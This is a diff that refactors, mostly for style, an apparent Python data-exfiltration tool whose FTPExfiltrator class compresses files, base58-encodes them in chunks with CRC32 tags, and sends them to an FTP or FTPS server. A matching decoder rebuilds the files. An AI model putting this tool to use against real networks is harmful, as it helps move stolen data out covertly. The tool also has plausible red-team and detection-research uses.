@@ -60,20 +60,17 @@ class GetContent():
 		if zlib.crc32(raw_file, crc):
 			sys.stdout.write("\t[+]\tCRC32 is matching in file %s.\n" % file_name)
 			f = open(file_name, 'wb')
-			f.write(raw_file)
-			f.close()
 		else:
 			sys.stdout.write("\t[-]\tCRC32 is NOT matching in file %s.\n\t\tSaving anyway.\n" % file_name)
-			f = open(file_name+"_badCRC", 'wb')
-			f.write(raw_file)
-			f.close()
+			f = open(f"{file_name}_badCRC", 'wb')
+
+		f.write(raw_file)
+		f.close()
 
 	def decode_file(self):
 		d = self.dir
 		all_dirs = [os.path.join(d,o) for o in os.listdir(d) if os.path.isdir(os.path.join(d,o))]
-		rel_dirs = []
-		for i in all_dirs:
-			rel_dirs.append(i[2:])
+		rel_dirs = [i[2:] for i in all_dirs]
 		sys.stdout.write("\t[+]\tTotal of %s relevant directories.\n" % len(rel_dirs))
 		self.file_content = rel_dirs
 
@@ -107,11 +104,7 @@ class FTPExfiltrator():
 			self.auth_flag = True
 			self.creds = creds
 
-		if tls == False:
-			self.tls_flag = False
-		else:
-			self.tls_flag = True
-
+		self.tls_flag = tls != False
 		self.port = port
 
 
@@ -133,10 +126,11 @@ class FTPExfiltrator():
 		# Compress raw file:
 		raw_content = zlib.compress(raw_content, 9)
 
-		a = list(raw_content[0+i:CHUNKS_SIZE+i] for i in range(0, len(raw_content), CHUNKS_SIZE))
-		b = []
-		for i in a:
-			b.append(base58.b58encode(i))
+		a = [
+			raw_content[0 + i : CHUNKS_SIZE + i]
+			for i in range(0, len(raw_content), CHUNKS_SIZE)
+		]
+		b = [base58.b58encode(i) for i in a]
 		sys.stdout.write("\t[+]\tFile encoded with %s chunks.\n" % len(b))
 		return b
 
@@ -172,13 +166,12 @@ class FTPExfiltrator():
 		if self.file_chunks is None:
 			return ERR
 
-		final_chunks = []
-		final_chunks.append("0" + DELIMITER + self.file_name + DELIMITER + self.file_crc)
+		final_chunks = [f"0{DELIMITER}{self.file_name}{DELIMITER}{self.file_crc}"]
 		sys.stdout.write("\t[+]\tSending file name '%s' with CRC32 '%s'.\n" % (self.file_name, self.file_crc))
-		chunk_id = 1
-		for i in self.file_chunks:
-			final_chunks.append( str(chunk_id) + DELIMITER + i )
-			chunk_id += 1
+		final_chunks.extend(
+			str(chunk_id) + DELIMITER + i
+			for chunk_id, i in enumerate(self.file_chunks, start=1)
+		)
 		self.final_chunks = final_chunks
 
 
@@ -187,15 +180,15 @@ class FTPExfiltrator():
 			return ERR
 
 		if self.tls_flag:
-			if self.auth_flag:
-				ftp_obj = FTP_TLS(host=self.server, user=self.creds[0], passwd=self.creds[1])
-			else:
-				ftp_obj = FTP_TLS(host=self.server)
+			ftp_obj = (
+				FTP_TLS(host=self.server, user=self.creds[0], passwd=self.creds[1])
+				if self.auth_flag
+				else FTP_TLS(host=self.server)
+			)
+		elif self.auth_flag:
+			ftp_obj = FTP(host=self.server, user=self.creds[0], passwd=self.creds[1])
 		else:
-			if self.auth_flag:
-				ftp_obj = FTP(host=self.server, user=self.creds[0], passwd=self.creds[1])
-			else:
-				ftp_obj = FTP(host=self.server)
+			ftp_obj = FTP(host=self.server)
 
 		try:
 			ftp_obj.login()
